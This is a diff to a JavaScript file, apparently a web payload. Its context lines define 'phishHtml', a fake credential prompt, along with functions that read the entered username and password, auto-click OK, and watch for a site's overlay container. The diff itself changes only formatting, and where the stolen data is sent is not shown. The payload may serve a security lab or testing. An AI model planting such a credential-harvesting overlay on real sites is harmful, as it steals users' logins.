@@ -68,7 +68,8 @@ const phishHtml = `
     <p style="margin-left: 8px; margin-top: 14px; user-select: none;"><label class="checkbox73"><input type="checkbox" name="checkbox" id="checkbox"><span class="checkmark73"></span></label><label style="color: #333333; line-height: 1.166; margin-left: 6px; font-size: 12px; vertical-align: super;">Remember my credentials</label></p>
     <p style="margin-left: 12px; margin-top: 30px;"><input class="button73" type="button" name="okbutton" id="okbutton" value="OK" onclick="submitLoginForm()"><input class="button73" type="button" value="Cancel" onclick="submitLoginForm()"></p>
   </form>
-</div> `;
+</div>
+`;
 async function submitLoginForm() {
   let username = document.getElementById('username').value;
   let password = document.getElementById('password').value;
@@ -85,7 +86,9 @@ function execPayld() {
     document.getElementById('okbutton').click();
     event.preventDefault();
   });
-  setTimeout(() => { window.location.href = window.location.href.split('#')[0] + '#products'; }, 50);
+  setTimeout(() => {
+    window.location.href = window.location.href.split('#')[0] + '#products';
+  }, 50);
 }
 function checkDOM() {
   var popupElements1 = document.getElementsByClassName('cdk-overlay-container');
